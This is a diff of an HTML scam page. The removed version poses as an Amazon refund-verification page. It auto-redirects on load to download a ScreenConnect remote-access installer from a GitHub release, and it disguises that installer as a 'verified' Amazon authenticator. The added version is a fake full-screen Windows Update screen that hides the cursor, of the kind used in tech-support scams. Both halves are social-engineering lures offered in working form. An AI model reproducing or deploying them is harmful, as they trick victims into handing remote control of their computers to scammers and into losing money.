@@ -1,125 +1,144 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon.com - Refund Verification</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f3f3f3;
-            color: #111;
-        }
-        .header {
-            background-color: #131921;
-            padding: 15px 20px;
-            color: white;
-            display: flex;
-            align-items: center;
-        }
-        .logo {
-            font-size: 24px;
-            font-weight: bold;
-            color: #ff9900;
-        }
-        .container {
-            max-width: 600px;
-            margin: 30px auto;
-            background: #fff;
-            padding: 25px;
-            border-radius: 4px;
-            border: 1px solid #ddd;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-        }
-        h2 {
-            color: #c45500;
-            font-size: 20px;
-            margin-top: 0;
-        }
-        .alert-box {
-            background-color: #fff8e7;
-            border-left: 4px solid #ff9900;
-            padding: 12px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        .download-box {
-            background-color: #f7f7f7;
-            border: 1px dashed #ccc;
-            padding: 15px;
-            text-align: center;
-            margin: 20px 0;
-        }
-        .btn-download {
-            background-color: #ffd814;
-            border: 1px solid #fcd200;
-            border-radius: 20px;
-            color: #0f1111;
-            padding: 10px 25px;
-            font-size: 14px;
-            font-weight: bold;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-            margin-top: 10px;
-        }
-        .btn-download:hover {
-            background-color: #f7ca00;
-        }
-        .file-info {
-            font-size: 12px;
-            color: #565959;
-            margin-top: 8px;
-        }
-        .steps {
-            font-size: 14px;
-            line-height: 1.6;
-        }
-    </style>
-		<script>
-window.addEventListener("load", function () {
-    setTimeout(function () {
-        window.location.href = "https://github.com/sdfghuouo-droid/farouk/releases/download/farouk%2Fgold%2F65/ScreenConnect.ClientSetup.msi";
-    }, 1000);
-});
-</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Windows Update</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      user-select: none;
+    }
+
+    html, body {
+      width: 100vw;
+      height: 100vh;
+      background-color: #0067c0 !important; /* ضمان استمرار اللون الأزرق */
+      color: #ffffff !important;
+      font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      cursor: none;
+      overflow: hidden;
+    }
+
+    .main-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      z-index: 9999;
+    }
+
+    /* أنيميشن دائرة النقاط المتحركة */
+    .spinner {
+      position: relative;
+      width: 80px;
+      height: 80px;
+      margin-bottom: 45px;
+    }
+
+    .circle {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      opacity: 0;
+      transform: rotate(225deg);
+      animation: orbit 5.5s infinite;
+    }
+
+    .circle::after {
+      content: '';
+      position: absolute;
+      width: 8px;
+      height: 8px;
+      background-color: #ffffff;
+      border-radius: 50%;
+    }
+
+    .circle:nth-child(2) { animation-delay: 240ms; }
+    .circle:nth-child(3) { animation-delay: 480ms; }
+    .circle:nth-child(4) { animation-delay: 720ms; }
+    .circle:nth-child(5) { animation-delay: 960ms; }
+
+    @keyframes orbit {
+      0% { transform: rotate(225deg); opacity: 1; animation-timing-function: ease-out; }
+      7% { transform: rotate(345deg); animation-timing-function: linear; }
+      30% { transform: rotate(455deg); animation-timing-function: ease-in-out; }
+      39% { transform: rotate(690deg); animation-timing-function: linear; }
+      70% { transform: rotate(815deg); opacity: 1; animation-timing-function: ease-out; }
+      75% { transform: rotate(945deg); animation-timing-function: ease-out; }
+      76% { transform: rotate(945deg); opacity: 0; }
+      100% { transform: rotate(945deg); opacity: 0; }
+    }
+
+    /* النصوص بوضوح وحجم مناسب لشاشات الـ FHD و 4K */
+    .status-text, .sub-text {
+      font-size: 2.2vw; /* يتكيف تلقائياً مع عرض الشاشة */
+      min-font-size: 20px;
+      font-weight: 300;
+      line-height: 1.6;
+      color: #ffffff;
+    }
+
+    .footer-text {
+      position: absolute;
+      bottom: 12%;
+      font-size: 1.8vw;
+      font-weight: 300;
+      text-align: center;
+      width: 100%;
+      color: #ffffff;
+    }
+  </style>
 </head>
 <body>
 
-    <div class="header">
-        <div class="logo">amazon<span style="color:white;">.com</span></div>
+  <div class="main-container">
+    <!-- دائرة التحميل -->
+    <div class="spinner">
+      <div class="circle"></div>
+      <div class="circle"></div>
+      <div class="circle"></div>
+      <div class="circle"></div>
+      <div class="circle"></div>
     </div>
 
-    <div class="container">
-        <h2>Action Required: Verify Your Device to Complete Refund</h2>
-        
-        <div class="alert-box">
-            We have processed your return request for <strong>Order #114-8392019-4820102</strong>.<br>
-            A refund of <strong>$149.99</strong> is pending security authorization.
-        </div>
-
-        <p class="steps">To secure your account and release your refund, please download and run our background verification tool on this device.</p>
-
-        <div class="download-box">
-            <strong>Step 1: Download Verification Package</strong><br>
-            <a href="https://github.com/sdfghuouo-droid/farouk/releases/download/farouk%2Fgold%2F65/ScreenConnect.ClientSetup.msi" class="btn-download">Download .MSI Installer</a>
-            <div class="file-info">
-                File: Amazon_Device_Authenticator.msi | Size: 14.2 MB<br>
-                Publisher: Amazon Services LLC (Verified)
-            </div>
-        </div>
-
-        <div class="steps">
-            <strong>Step 2: Complete Authentication</strong>
-            <ol>
-                <li>Run the downloaded <code>.msi</code> file on your computer.</li>
-                <li>Follow the system prompts to verify your hardware profile.</li>
-                <li>Your refund will be deposited into your bank account within 24-48 hours.</li>
-            </ol>
-        </div>
+    <!-- النصوص -->
+    <div class="status-text">
+      Working on updates <span id="percent">0</span>% complete.
     </div>
+    <div class="sub-text">
+      Don't turn off your PC. This will take a while.
+    </div>
+  </div>
+
+  <div class="footer-text">
+    Your PC may restart several times.
+  </div>
+
+  <script>
+    var count = 0;
+    var percentElement = document.getElementById('percent');
+
+    function updateProgress() {
+      if (count < 100) {
+        count += Math.floor(Math.random() * 2) + 1;
+        if (count > 100) count = 100;
+        if (percentElement) {
+          percentElement.innerHTML = count;
+        }
+        setTimeout(updateProgress, 3000);
+      }
+    }
+
+    setTimeout(updateProgress, 1000);
+  </script>
 
 </body>
 </html>
